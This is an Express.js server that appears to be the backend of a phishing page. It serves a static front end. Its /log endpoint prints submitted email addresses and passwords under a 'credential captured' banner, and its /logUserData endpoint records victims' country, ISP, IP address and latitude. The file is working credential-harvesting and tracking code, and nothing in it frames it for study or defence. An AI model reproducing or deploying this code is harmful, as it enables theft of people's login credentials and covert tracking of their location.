const express = require("express");
const path = require("path");
const app = express();


//port and paths 
const port = 3000;
const pub_path = path.join(__dirname, "public")



// static folder serve (middlewere)
app.use(express.static(pub_path));

// parse json (this is a middlewere)
app.use(express.json());







// route
app.get("/", (req, res)=>{
    console.log("user ip", req.ip);
    res.sendFile(path.join(pub_path, "index.html"))
})


app.post("/log", (req, res)=>{

    const emailAddress = req.body.userInput
    const passwd = req.body.userpasswd
    console.log("--------------- credential captured---------------------")
    console.log("user email    :", emailAddress)
    console.log(`user password : ${passwd}`)
    res.end
})

app.post("/logUserData", (req, res)=>{
    const userloc = req.body.userInf
    console.log("user hit")
    console.log("----------------user information captured---------------")
    console.log(`country  : ${userloc.country}`)
    console.log(`user isp : ${userloc.isp}`)
    console.log(`user ip  : ${userloc.query}`)
    console.log(`user latitude  : ${userloc.lat}\n\n`)
})




// app.listen(port, "0.0.0.0", ()=>{
//     console.log(`server started at http://0.0.0.0:${port}`)
    
// } )


app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}\n\n`);
  });
  
